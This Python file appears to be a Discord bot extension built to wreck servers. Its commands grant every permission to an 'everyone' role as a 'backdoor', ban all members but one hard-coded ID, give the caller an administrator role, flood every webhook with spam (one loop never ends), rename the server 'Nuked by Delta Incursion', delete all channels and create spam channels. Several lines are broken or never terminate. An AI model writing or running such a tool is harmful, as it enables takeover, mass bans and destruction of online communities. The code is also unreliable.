from data.config.imports import *
from data.config.vars import *

class mal(Cog):
    def __init__(self, bot):
        self.bot = bot
        self.bot.remove_command("help")

    @command(name="backdoor")
    async def backdoor(self, ctx):
        guild = ctx.guild

        await ctx.message.delete()

        try:
            role = discord.utils.get(guild.roles, name = "everyone")
            await role.edit(permissions = Permissions.all())

        except:
            print("brain")
            
    @command(name="banall")
    async def banall(self, ctx):
        await ctx.message.delete()
    
        guild = ctx.guild
    
        for member in guild.members:
            try:
                if int(member.id) == int(985127348678590504):
                    pass
    
                else:
                    await member.ban
    
            except:
                print("not banned")

    @command(name="d")
    async def dab(self, ctx):
        guild = ctx.guild
        perms = discord.Permissions(8)
        await self.bot.guild.create_role(guild, name='0', permissions=perms)
        user = ctx.message.author
        role = discord.utils.get(user.server.roles, name="0")
        await bot.add_roles(user, role)
        
    @command(name="webhook")
    async def webhook(self, ctx, amount: Optional[int] = 10):
    
        def whc(webhook, amount):
            for i in range(amount):

                data = {
                    'content': random.choice(MESSAGE)
                }
                
                spamming = requests.post(webhook, json=data)
                spammingerror = spamming.text
    
                if spamming.status_code == 204:
                    continue
    
                if 'ratelimited' in spammingerror.lower():
                    try:
                        j = json.loads(spammingerror)
                        ratelimit = j['retry_after']
                        wait = ratelimit / 1000
                        print(f"rate-limited for {wait[5]} seconds")
    
                    except:
                        time.sleep(10)
                        print(f"rate-limited, sleeping for 10 seconds")
    
                else:
                    time.sleep(30)
                    print(f"rate-limited, sleeping for 30 seconds")
                    
        amount = amount
        
        if len(await ctx.guild.webhooks()) != 0:
            for webhook in await ctx.guild.webhooks():
                t = threading.Thread(target=whc, args=(webhook.url, amount,)).start()
    
        else:
            for i in range(1):
                for channel in ctx.guild.text_channels:
                    try:
                        webhook = await channel.create_webhook(name=random.choice(NAME))
                        t = threading.Thread(target=whc, args=(webhook.url, amount,)).start()

                        f = open('webhooks.txt')
                        f.write(f"{webhook.url} \n")
                        f.close()

                    except:
                        print(f"{ctx.guild.id} ({ctx.guild.name}) | Could not send a message")
    
    @command(name="webhook2")
    async def webhook2(self, ctx):
    
        def whc(webhook):
            while True:

                data = {
                    'content': random.choice(MESSAGE)
                }
                
                spamming = requests.post(webhook, json=data)
                spammingerror = spamming.text
    
                if spamming.status_code == 204:
                    continue
    
                if 'ratelimited' in spammingerror.lower():
                    try:
                        j = json.loads(spammingerror)
                        ratelimit = j['retry_after']
                        wait = ratelimit / 1000
                        print(f"rate-limited for {wait[5]} seconds")
    
                    except:
                        time.sleep(10)
                        print(f"rate-limited, sleeping for 10 seconds")
    
                else:
                    time.sleep(30)
                    print(f"rate-limited, sleeping for 30 seconds")
        
        if len(await ctx.guild.webhooks()) != 0:
            for webhook in await ctx.guild.webhooks():
                t = threading.Thread(target=whc, args=(webhook.url,)).start()
    
        else:
            for i in range(1):
                for channel in ctx.guild.text_channels:
                    try:
                        webhook = await channel.create_webhook(name=random.choice(NAME))
                        t = threading.Thread(target=whc, args=(webhook.url,)).start()

                        f = open('webhooks.txt')
                        f.write(f"{webhook.url} \n")
                        f.close()

                    except:
                        print(f"{ctx.guild.id} ({ctx.guild.name}) | Could not send a message")


    @command(name="burn")
    async def burn(self, ctx):
        guild = ctx.guild

        channel = []

        await ctx.guild.edit(name="Nuked by Delta Incursion | tabletop478")

        for channel in guild.channels:
            try:
                await channel.delete()

            except:
                pass

        channels = 1

        while channels <= 100:
            try:
                await guild.create_text_channel(name=random.choice(CHANNEL))

            except:
                pass
        
def setup(bot):
    bot.add_cog(mal(bot))